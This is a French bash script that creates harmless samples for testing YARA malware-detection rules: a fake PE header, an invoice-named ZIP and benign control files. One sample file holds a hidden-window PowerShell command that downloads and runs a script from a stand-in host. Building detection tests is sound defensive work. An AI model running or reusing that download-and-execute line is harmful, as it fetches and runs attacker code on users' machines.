#!/usr/bin/env bash
# creer-echantillons.sh — Crée des échantillons INOFFENSIFS pour tester les règles YARA.
# Aucun de ces fichiers n'est exécutable ni malveillant : ils imitent seulement
# les caractéristiques que les règles recherchent.
set -euo pipefail
D="${1:-echantillons}"
mkdir -p "$D"

# 1. Faux exécutable PE : en-tête MZ, pointeur en 0x3C vers la signature "PE\0\0"
python3 - "$D/faux_programme.exe" <<'EOF'
import sys, struct
b = bytearray(512)
b[0:2] = b"MZ"
b[0x3C:0x40] = struct.pack("<I", 0x80)
b[0x4E:0x4E+38] = b"This program cannot be run in DOS mode"
b[0x80:0x84] = b"PE\x00\x00"
open(sys.argv[1], "wb").write(b)
EOF

# 2. Script de type « téléchargeur » PowerShell (jamais exécuté)
cat > "$D/facture.ps1.txt" <<'EOF'
# Exemple de commande de téléchargeur (inoffensif : texte seulement)
powershell -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://exemple.invalid/a.ps1')"
EOF

# 3. Archive ZIP contenant un fichier nommé .exe (le contenu n'est que du texte)
echo "ceci n'est pas un programme" > "$D/facture_2026.exe"
( cd "$D" && python3 -c "import zipfile; z=zipfile.ZipFile('facture.zip','w'); z.write('facture_2026.exe'); z.close()" )
rm "$D/facture_2026.exe"

# 4. Fichiers témoins qui ne doivent PAS être détectés
echo "Bonjour, voici le compte rendu de la réunion." > "$D/note.txt"
echo "Get-Process | Sort-Object CPU" > "$D/admin_legitime.ps1.txt"

ls -l "$D"
